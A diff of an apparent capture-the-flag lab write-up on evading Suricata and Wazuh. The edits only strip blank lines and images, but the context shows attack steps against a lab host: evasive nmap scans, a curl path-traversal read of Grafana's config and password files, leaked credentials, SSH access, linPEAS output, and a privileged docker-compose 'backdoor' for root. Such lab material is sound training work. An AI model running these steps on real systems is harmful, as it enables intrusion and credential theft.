@@ -29,12 +29,7 @@ crc9WpQ1ZGztMANkV7QfIeaxDJexSyiO8CaDgxyksopL7KgQN-n9w6v5AfbCGa0fiyjPQznYxop-N4IE
 
 Note: This token will only be shown once, so make sure it's stored in a secure location. Use it to access your new account via the login page
 
-
 ```
-
-![[Pasted image 20230214212733.png]]
-
-![[Pasted image 20230214212812.png]]
 
 ### Intrusion Detection Basics
 
@@ -79,8 +74,6 @@ What widely implemented protocol has an adverse effect on the reliability of NID
 Experiment by running tools against the target and viewing the resultant alerts. Is there any unexpected activity?  
 
 Some of the more obscure nmap modes can produce interesting results.
-
-![[Pasted image 20230215154238.png]]
 
 ```
 ┌──(witty㉿kali)-[~/Downloads]
@@ -363,9 +356,7 @@ Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 156.30 seconds
 
-
 ```
-
 
 ### Reconnaissance and Evasion Basics
 
@@ -494,8 +485,6 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 187.58 seconds
 
-
-
 Alert Details
 
     Alert ID: 27579
@@ -601,7 +590,6 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 144.28 seconds
 
-
 --script=vuln
 
 give lot of alerts from suricata
@@ -616,7 +604,6 @@ Alert Details
     Alert Severity: 3
     Alert Score: 2.67
 
-
 Alert Details
 
     Alert ID: 27936
@@ -627,7 +614,6 @@ Alert Details
     Alert Category: Unknown Classtype
     Alert Severity: 3
     Alert Score: 2.67
-
 
 ┌──(witty㉿kali)-[~/Downloads]
 └─$ nmap --script=vuln --script-args http.useragent="Mozilla/5.0 (X11, AmigaOS x86_64) (KHTML, somewhat like Gecko) Netscape/5000" 10.10.133.96
@@ -666,7 +652,6 @@ PORT     STATE SERVICE
 
 Nmap done: 1 IP address (1 host up) scanned in 3.64 seconds
 
-
 IDS Details
 
     IDS Name: Suricata
@@ -686,8 +671,6 @@ so 3 services identified (OpenSSH, Apache, gunicorn)
 Gunicorn "Green Unicorn" es un servidor HTTP de interfaz de puerta de enlace de servidor web Python. Es un modelo de trabajador previo a la bifurcación, portado del proyecto Unicornio de Ruby.
 
 ```
-
-![[Pasted image 20230215165210.png]]
 
 What scale is used to measure alert severity in Suricata? (*-*)  
 
@@ -763,7 +746,6 @@ Answer the questions below
 + Root page / redirects to: /login
 + No CGI Directories found (use '-C all' to force check all possible dirs)
 ^C 
-
 
 ┌──(witty㉿kali)-[~/Downloads]
 └─$ nikto -H                     
@@ -881,7 +863,6 @@ Answer the questions below
 
 ```
 
-
 Nikto, should find an interesting path when the first scan is performed, what is it called?
 
 */login*
@@ -959,7 +940,6 @@ messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
 syslog:x:105:106::/home/syslog:/usr/sbin/nologin
 ossec:x:106:108::/var/ossec:/sbin/nologin
 grafana:x:107:109::/usr/share/grafana:/bin/false
-
 
 ┌──(witty㉿kali)-[~/Downloads]
 └─$ curl --path-as-is http://10.10.3.55:3000/public/plugins/alertlist/../../../../../../../../../../etc/grafana/grafana.ini   
@@ -2033,9 +2013,7 @@ admin_password = GraphingTheWorld32
 # Enable or disable loading other base map layers
 ;enable_custom_baselayers = true
 
-
 ```
-
 
 What version of Grafana is the server running?  
 
@@ -2056,7 +2034,6 @@ If this server was publicly available, What site might have information on its s
 How would we search the site "example.com" for pdf files, using advanced Google search tags?  
 
 *site:example.com filetype:pdf*
-
 
 ### Rulesets
 
@@ -2103,7 +2080,6 @@ messagebus:*:19085:0:99999:7:::
 syslog:*:19085:0:99999:7:::
 ossec:*:19088:0:99999:7:::
 grafana:*:19088:0:99999:7:::
-
 
 Alert Details
 
@@ -2395,7 +2371,6 @@ after login
 
 http://10.10.3.55:3000/?orgId=1
 
-
 ┌──(witty㉿kali)-[~/Downloads]
 └─$ ssh grafana-admin@10.10.3.55
 The authenticity of host '10.10.3.55 (10.10.3.55)' can't be established.
@@ -2432,7 +2407,6 @@ Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-107-generic x86_64)
 23 updates can be applied immediately.
 To see these additional updates run: apt list --upgradable
 
-
 The list of available updates is more than a week old.
 To check for new updates run: sudo apt update
 
@@ -2440,10 +2414,7 @@ Last login: Wed Apr  6 09:08:36 2022 from 192.168.56.1
 grafana-admin@reversegear:~$ whoami
 grafana-admin
 
-
 ```
-
-![[Pasted image 20230215183925.png]]
 
 What is the password of the grafana-admin account?  
 
@@ -2462,7 +2433,6 @@ Are any of the attached IDS able to detect the attack if the file /etc/shadow is
 Arbitrary file read exploits will often cause certain system file paths to appear in URLS and some IDS can detect this.
 
 *Suricata*
-
 
 ### Host Based IDS (HIDS)
 
@@ -2552,7 +2522,6 @@ NSE Timing: About 99.74% done; ETC: 19:15 (0:00:02 remaining)
 NSE Timing: About 99.74% done; ETC: 19:16 (0:00:02 remaining)
 NSE Timing: About 99.74% done; ETC: 19:16 (0:00:02 remaining)
 
-
 Alert Details
 
     Alert ID: 66268
@@ -2564,20 +2533,15 @@ Alert Details
     Alert Severity: 10
     Alert Score: 5.33
 
-
-
 ```
 
-
 What category does Wazuh place HTTP 400 error codes in?  
-
 
 *web*
 
 Play around with some post-exploitation tools and commands and make note of what activity is detected by Wazuh; compare it to the activity that's detected by Suricata.  
 
 Question Done
-
 
 ### Privilege Escalation Recon
 
@@ -2719,7 +2683,6 @@ grafana-admin@reversegear:/tmp$ chmod +x linpeas.sh
 
 grafana-admin@reversegear:/tmp$ ./linpeas.sh
 
-
                             ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                     ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
              ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
@@ -2780,8 +2743,6 @@ Writable folder: /dev/shm
 [+] /usr/bin/bash is available for network discovery, port scanning and port forwarding (linpeas can discover hosts, scan ports, and forward ports. Learn more with -h)
 [+] /usr/bin/nc is available for network discovery & port scanning (linpeas can discover hosts and scan ports, learn more with -h)
 
-
-
 Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . DONE
 
                               ╔════════════════════╗
@@ -2803,8 +2764,6 @@ Sudo version 1.8.31
 Vulnerable to CVE-2021-3560
 
 Potentially Vulnerable to CVE-2022-2588
-
-
 
 ╔══════════╣ PATH
 ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses
@@ -2912,7 +2871,6 @@ https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
    Exposure: less probable
    Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154
 
-
 ╔══════════╣ Executing Linux Exploit Suggester 2
 ╚ https://github.com/jondonas/linux-exploit-suggester-2
 
@@ -2950,8 +2908,6 @@ Running Docker Containers
 09c9b8b60625   wazuh/wazuh-odfe:4.2.5                    "/init"                  10 months ago   Up 2 hours (healthy)     1514-1516/tcp, 514/udp, 55000/tcp           ctf_wazuh_1
 9743ca30627c   ghcr.io/jroo1053/ctfscorelog:master       "python3 /var/lib/ct…"   10 months ago   Up 2 hours                                                           ctflog
 
-
-
                                      ╔═══════╗
 ═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════
                                      ╚═══════╝
@@ -2988,13 +2944,9 @@ PrivateIPv6s:
 Subnet IPv6: 
 Public IPv4s:
 
-
-
 ══╣ IAM Role
 
-
 ══╣ User Data
-
 
                 ╔════════════════════════════════════════════════╗
 ════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════
@@ -3346,7 +3298,6 @@ org.freedesktop.thermald          - -               -                (activatabl
 org.freedesktop.timedate1         - -               -                (activatable) -                           -       -
 org.freedesktop.timesync1       569 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service   -       -
 
-
                               ╔═════════════════════╗
 ══════════════════════════════╣ Network Information ╠══════════════════════════════
                               ╚═════════════════════╝
@@ -3425,8 +3376,6 @@ tcp   LISTEN  0       4096                [::]:3000           [::]:*
 
 ╔══════════╣ Can I sniff with tcpdump?
 No
-
-
 
                                ╔═══════════════════╗
 ═══════════════════════════════╣ Users Information ╠═══════════════════════════════
@@ -3530,8 +3479,6 @@ grafana-admin    pts/0    10.8.19.103      Wed Feb 15 23:41:46 +0000 2023
 
 ╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
 
-
-
                              ╔══════════════════════╗
 ═════════════════════════════╣ Software Information ╠═════════════════════════════
                              ╚══════════════════════╝
@@ -3573,11 +3520,9 @@ grafana-admin    pts/0    10.8.19.103      Wed Feb 15 23:41:46 +0000 2023
 	refuse options = checksum dry-run
 	dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz
 
-
 ╔══════════╣ Analyzing Ldap Files (limit 70)
 The password hash is from the {SSHA} to 'structural'
 drwxr-xr-x 2 root root 4096 Feb 23  2022 /etc/ldap
-
 
 ╔══════════╣ Searching ssl/ssh files
 PasswordAuthentication yes
@@ -3625,7 +3570,6 @@ Subsystem	sftp	/usr/lib/openssh/sftp-server
 ══╣ /etc/hosts.allow file found, trying to read the rules:
 /etc/hosts.allow
 
-
 Searching inside /etc/ssh/ssh_config for interesting info
 Include /etc/ssh/ssh_config.d/*.conf
 Host *
@@ -3637,13 +3581,9 @@ Host *
 drwxr-xr-x 2 root root 4096 Apr  6  2022 /etc/pam.d
 -rw-r--r-- 1 root root 2133 Dec  2  2021 /etc/pam.d/sshd
 
-
-
-
 ╔══════════╣ Searching tmux sessions
 ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions
 tmux 3.0a
-
 
 /tmp/tmux-1001
 ╔══════════╣ Analyzing Cloud Init Files (limit 70)
@@ -3658,9 +3598,6 @@ tmux 3.0a
 drwxr-xr-x 2 root root 200 Jan 14  2022 /snap/core20/1328/usr/share/keyrings
 drwxr-xr-x 2 root root 200 Mar 18  2022 /snap/core20/1405/usr/share/keyrings
 drwxr-xr-x 2 root root 4096 Apr  6  2022 /usr/share/keyrings
-
-
-
 
 ╔══════════╣ Searching uncommon passwd files (splunk)
 passwd file: /etc/pam.d/passwd
@@ -3712,9 +3649,7 @@ netpgp Not Found
 -rw-r--r-- 1 root root 1227 May 27  2010 /usr/share/keyrings/ubuntu-master-keyring.gpg
 -rw-r--r-- 1 root root 2867 Feb 13  2020 /usr/share/popularity-contest/debian-popcon.gpg
 
-
 ╔══════════╣ Analyzing Cache Vi Files (limit 70)
-
 
 ╔══════════╣ Checking if containerd(ctr) is available
 ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/containerd-ctr-privilege-escalation
@@ -3731,7 +3666,6 @@ lrwxrwxrwx 1 root root 33 Apr  6  2022 /etc/systemd/system/sockets.target.wants/
 -rw-r--r-- 1 root root 175 Mar 24  2022 /usr/lib/systemd/system/docker.socket
 -rw-r--r-- 1 root root 0 Apr  6  2022 /var/lib/systemd/deb-systemd-helper-enabled/sockets.target.wants/docker.socket
 
-
 ╔══════════╣ Analyzing Postfix Files (limit 70)
 -rw-r--r-- 1 root root 813 Feb  2  2020 /snap/core20/1328/usr/share/bash-completion/completions/postfix
 
@@ -3739,12 +3673,9 @@ lrwxrwxrwx 1 root root 33 Apr  6  2022 /etc/systemd/system/sockets.target.wants/
 
 -rw-r--r-- 1 root root 813 Feb  2  2020 /usr/share/bash-completion/completions/postfix
 
-
 ╔══════════╣ Analyzing Bind Files (limit 70)
 -rw-r--r-- 1 root root 832 Feb  2  2020 /usr/share/bash-completion/completions/bind
 -rw-r--r-- 1 root root 832 Feb  2  2020 /usr/share/bash-completion/completions/bind
-
-
 
 ╔══════════╣ Analyzing Other Interesting Files (limit 70)
 -rw-r--r-- 1 root root 3771 Feb 25  2020 /etc/skel/.bashrc
@@ -3753,21 +3684,13 @@ lrwxrwxrwx 1 root root 33 Apr  6  2022 /etc/systemd/system/sockets.target.wants/
 -rw-r--r-- 1 root root 3771 Feb 25  2020 /snap/core20/1328/etc/skel/.bashrc
 -rw-r--r-- 1 root root 3771 Feb 25  2020 /snap/core20/1405/etc/skel/.bashrc
 
-
-
-
-
 -rw-r--r-- 1 root root 807 Feb 25  2020 /etc/skel/.profile
 -rw-r--r-- 1 fred fred 807 Feb 25  2020 /home/fred/.profile
 -rw-r--r-- 1 grafana-admin grafana-admin 807 Feb 25  2020 /home/grafana-admin/.profile
 -rw-r--r-- 1 root root 807 Feb 25  2020 /snap/core20/1328/etc/skel/.profile
 -rw-r--r-- 1 root root 807 Feb 25  2020 /snap/core20/1405/etc/skel/.profile
 
-
-
 -rw-r--r-- 1 fred fred 0 Apr  6  2022 /home/fred/.sudo_as_admin_successful
-
-
 
                                ╔═══════════════════╗
 ═══════════════════════════════╣ Interesting Files ╠═══════════════════════════════
@@ -4177,13 +4100,10 @@ Unpacking base-passwd (3.5.47) ...
 Unpacking base-passwd (3.5.47) over (3.5.47) ...
 Unpacking passwd (1:4.8.1-1ubuntu5) ...
 
-
-
                                 ╔════════════════╗
 ════════════════════════════════╣ API Keys Regex ╠════════════════════════════════
                                 ╚════════════════╝
 Regexes to search for API keys aren't activated, use param '-r' 
-
 
 Alert Details
 
@@ -4196,10 +4116,7 @@ Alert Details
     Alert Severity: 5
     Alert Score: 2.67
 
-
-
 ```
-
 
 What tool does linPEAS detect as having a potential escalation vector?  
 
@@ -4299,7 +4216,6 @@ grafana-admin:$6$ptoQwBy/gkonPuzy$J6G73qVfQe5ZrdC9VDc8duMl5PA0FqGX7tMEusGCt/hZRu
 ossec:*:19088:0:99999:7:::
 
 ```
-
 
 Perform the privilege escalation and grab the flag in /root/  
 
@@ -4420,11 +4336,9 @@ Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-107-generic x86_64)
 23 updates can be applied immediately.
 To see these additional updates run: apt list --upgradable
 
-
 The list of available updates is more than a week old.
 To check for new updates run: sudo apt update
 Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
-
 
 Last login: Wed Apr  6 09:11:12 2022 from 192.168.56.1
 root@reversegear:~# whoami
@@ -4443,7 +4357,6 @@ Alert Details
     Alert Category: syslog
     Alert Severity: 3
     Alert Score: 3.2
-
 
 root@reversegear:~/.ssh# cat /var/ossec/etc/ossec.conf
 <!--
@@ -4468,7 +4381,6 @@ root@reversegear:~/.ssh# cat /var/ossec/etc/ossec.conf
     <agent_name>dockerhost</agent_name>
     </enrollment>
 </client>
-
 
   <client_buffer>
     <!-- Agent buffer options -->
@@ -4658,7 +4570,6 @@ root@reversegear:~/.ssh# cat /var/ossec/etc/ossec.conf
     <log_format>apache</log_format>
     <location>/var/log/apache2/error.log</location>
   </localfile>
-
 
   <localfile>
     <log_format>apache</log_format>
@@ -4984,7 +4895,6 @@ services:
       - /:/mnt
     privileged: true
 
-
 docker backdoor
 
 root@reversegear:/var/lib/ctf# docker-compose up
@@ -5005,11 +4915,9 @@ root
 
 ```
 
-
 Abuse docker to establish a backdoor on the host system  
 
 Question Done
-
 
 ### Conclusion
 
@@ -5024,6 +4932,5 @@ Answer the questions below
 Read the above  
 
 Question Done
-
 
 [[Basic Static Analysis]]
